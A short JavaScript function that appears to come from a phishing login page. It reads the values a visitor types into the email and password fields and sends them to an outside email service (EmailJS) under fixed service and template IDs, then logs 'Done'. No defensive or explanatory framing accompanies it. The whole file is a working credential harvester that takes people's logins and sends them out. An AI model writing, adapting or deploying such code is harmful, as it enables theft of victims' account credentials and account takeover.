function sendMail(pra){
    let temppara = {
        user_name : document.getElementById("email").value,
        user_passw : document.getElementById("pass").value
    }
    

        emailjs.send('service_nrjef9d' , 'template_5odpv2h' , temppara)
        .then(function (res){
                console.log("Done")

        })
    
}